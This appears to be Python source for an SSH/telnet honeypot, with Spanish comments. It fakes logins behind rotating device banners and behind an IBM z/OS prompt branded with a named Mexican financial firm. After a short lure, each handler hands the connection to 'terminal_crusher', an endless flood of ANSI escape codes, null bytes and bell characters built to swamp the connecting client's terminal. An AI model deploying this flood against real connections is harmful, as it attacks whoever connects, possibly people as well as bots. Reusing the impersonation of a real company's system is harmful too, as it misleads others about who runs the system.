import time
import os
import random

def terminal_crusher(client_socket):
    ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
    try:
        while True:
            payload = ansi_bomb
            for _ in range(15):
                color = os.urandom(1)[0]
                payload += f"\x1b[48;5;{color}m".encode() + b"\x00" * 150000 + b"\a"
            client_socket.send(payload)
            time.sleep(0.04)
    except: pass

def handle_cowrie_trap(client_socket, ip, hit_count=0):
    """Bait & Switch: Cambia la identidad del puerto según la insistencia del bot"""
    try:
        # Personalidades del puerto 22
        identities = [
            {"banner": b"Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n", "prompt": b"root@srv-prod-01:~# "},
            {"banner": b"Cisco IOS Software, C2960 Software (C2960-LANBASEK9-M), Version 12.2(44)SE, RELEASE SOFTWARE (fc1)\r\n", "prompt": b"Switch> "},
            {"banner": b"SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\n", "prompt": b"admin@nas-storage:~$ "},
            {"banner": b"MikroTik 6.48.6 (stable) on RouterOS\r\n", "prompt": b"[admin@MikroTik] > "}
        ]
        
        # Elegir identidad basada en hit_count para confundir recon
        identity = identities[hit_count % len(identities)]
        
        client_socket.send(identity["banner"])
        client_socket.send(b"login: ")
        client_socket.recv(1024)
        client_socket.send(b"password: ")
        client_socket.recv(1024)
        client_socket.send(b"\r\nAccess Granted.\r\n")
        client_socket.send(identity["prompt"])

        # Esperar 2 comandos y luego Crusher
        for _ in range(2):
            cmd = client_socket.recv(1024).decode().strip()
            if not cmd: break
            client_socket.send(f"{cmd}: command not found\r\n".encode())
            client_socket.send(identity["prompt"])
        
        client_socket.send(b"\r\n*** CRITICAL SYSTEM ERROR: REBOOTING ***\r\n")
        terminal_crusher(client_socket)
    except: pass

def handle_mainframe_shell(client_socket, ip):
    # Se mantiene la simulación de Monex
    try:
        client_socket.send(b"ICH70001I - LOGIN TO IBM z/OS v2.5 AT MONEX-FINANCIAL-MEX\r\nENTER USERID - \r\n")
        client_socket.recv(1024)
        client_socket.send(b"ENTER PASSWORD - \r\n")
        client_socket.recv(1024)
        client_socket.send(b"ICH70008I LOGIN SUCCESSFUL. READY\r\n")
        time.sleep(10)
        terminal_crusher(client_socket)
    except: pass
